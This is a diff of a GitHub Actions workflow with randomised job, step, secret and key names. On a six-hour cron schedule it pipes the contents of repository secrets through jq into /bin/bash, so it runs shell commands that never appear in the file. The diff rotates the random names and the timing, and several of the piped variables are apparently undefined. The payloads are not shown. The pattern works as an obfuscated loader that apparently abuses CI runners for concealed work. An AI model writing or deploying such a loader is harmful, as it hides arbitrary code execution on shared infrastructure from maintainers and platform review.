@@ -2,24 +2,21 @@ name: yuanqingshen2456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
-jobs:  # 21936
+    - cron: '46 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuanqingshen2456
         env:
-          qemn9374: ${{ secrets.qemn9374 }}
+          qql4: ${{ secrets.qql4 }}
         run: |
-          echo $qemn9374 | jq -r .jdwby5 | /bin/bash
-          echo $rr5426 | jq -r .jjhwl5829 | /bin/bash
-          echo $vcs9 | jq -r .gxz02 | /bin/bash
-          echo $vnth43 | jq -r .k8991 | /bin/bash
-          echo $sbobg1980 | jq -r .iv5340 | /bin/bash
-          echo $pxxnw1 | jq -r .f63648 | /bin/bash
-          echo $mk538 | jq -r .ws63 | /bin/bash
-          echo $ylhkr408 | jq -r .c7037 | /bin/bash
-          echo $sobwq91 | jq -r .wf1349 | /bin/bash
-          echo $h435 | jq -r .cvlw4562 | /bin/bash
+          echo $qql4 | jq -r .fbzeu565 | /bin/bash
+          echo $gtgy63 | jq -r .zy1387 | /bin/bash
+          echo $tbslj2800 | jq -r .jqal9 | /bin/bash
+          echo $sa97 | jq -r .bhetc55082 | /bin/bash
+          echo $gogkn3586 | jq -r .o3 | /bin/bash
+          echo $nagzt908 | jq -r .s484 | /bin/bash
 
